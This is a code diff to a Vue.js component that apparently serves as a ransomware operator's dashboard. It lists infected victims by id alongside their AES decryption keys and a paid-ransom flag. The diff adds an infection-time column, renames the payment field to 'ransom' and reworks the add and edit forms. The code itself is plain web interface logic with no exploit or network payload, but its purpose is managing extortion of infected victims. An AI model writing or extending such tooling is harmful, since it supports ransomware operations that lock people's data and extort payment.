@@ -10,6 +10,7 @@
           <thead>
             <tr>
               <th scope="col">Victim id</th>
+              <th scope="col">Time</th>
               <th scope="col">AES_key</th>
               <th scope="col">Paid?</th>
               <th></th>
@@ -18,9 +19,10 @@
           <tbody>
             <tr v-for="(victim, index) in victims" :key="index">
               <td>{{ victim.id }}</td>
+              <td>{{ victim.inf_time }}</td>
               <td>{{ victim.AES_key }}</td>
               <td>
-                <span v-if="victim.paid">Yes</span>
+                <span v-if="victim.ransom">Yes</span>
                 <span v-else>No</span>
               </td>
               <td>
@@ -55,9 +57,9 @@
                     label-for="form-title-edit-input">
           <b-form-input id="form-title-edit-input"
                         type="text"
-                        v-model="editForm.title"
+                        v-model="editForm.id"
                         required
-                        placeholder="Enter title">
+                        placeholder="Enter id">
           </b-form-input>
         </b-form-group>
         <b-form-group id="form-AES_key-edit-group"
@@ -94,15 +96,17 @@ export default {
       victims: [],
       addVictimForm: {
         id: '',
+        inf_time: '',
+        ransom: [],
         AES_key: '',
-        paid: [],
       },
       message: '',
       showMessage: false,
       editForm: {
         id: '',
+        inf_time: '',
+        ransom: [],
         AES_key: '',
-        paid: [],
       },
     };
   },
@@ -137,43 +141,46 @@ export default {
     },
     initForm() {
       this.addVictimForm.id = '';
+      this.addVictimForm.inf_time = '';
       this.addVictimForm.AES_key = '';
-      this.addVictimForm.paid = [];
+      this.addVictimForm.ransom = [];
       this.editForm.id = '';
+      this.editForm.inf_time = '';
       // this.editForm.title = '';
       this.editForm.AES_key = '';
-      this.editForm.paid = [];
+      this.editForm.ransom = [];
     },
-    onSubmit(evt) {
-      evt.preventDefault();
-      this.$refs.addVictimModal.hide();
-      let paid = false;
-      if (this.addVictimForm.paid[0]) paid = true;
-      const payload = {
-        title: this.addVictimForm.title,
-        AES_key: this.addVictimForm.AES_key,
-        paid, // property shorthand
-      };
-      this.addVictim(payload);
-      this.initForm();
-    },
-    onReset(evt) {
-      evt.preventDefault();
-      this.$refs.addVictimModal.hide();
-      this.initForm();
-    },
+    // onSubmit(evt) {
+    //   evt.preventDefault();
+    //   this.$refs.addVictimModal.hide();
+    //   let ransom = false;
+    //   if (this.addVictimForm.ransom[0]) ransom = true;
+    //   const payload = {
+    //     title: this.addVictimForm.title,
+    //     AES_key: this.addVictimForm.AES_key,
+    //     ransom, // property shorthand
+    //   };
+    //   this.addVictim(payload);
+    //   this.initForm();
+    // },
+    // onReset(evt) {
+    //   evt.preventDefault();
+    //   this.$refs.addVictimModal.hide();
+    //   this.initForm();
+    // },
     editVictim(victim) {
       this.editForm = victim;
     },
     onSubmitUpdate(evt) {
       evt.preventDefault();
       this.$refs.editVictimModal.hide();
-      let paid = false;
-      if (this.editForm.paid[0]) paid = true;
+      let ransom = false;
+      if (this.editForm.ransom[0]) ransom = true;
       const payload = {
-        title: this.editForm.title,
+        id: this.editForm.id,
+        // inf_time: this.editForm.inf_time,
         AES_key: this.editForm.AES_key,
-        paid,
+        ransom,
       };
       this.updateVictim(payload, this.editForm.id);
     },
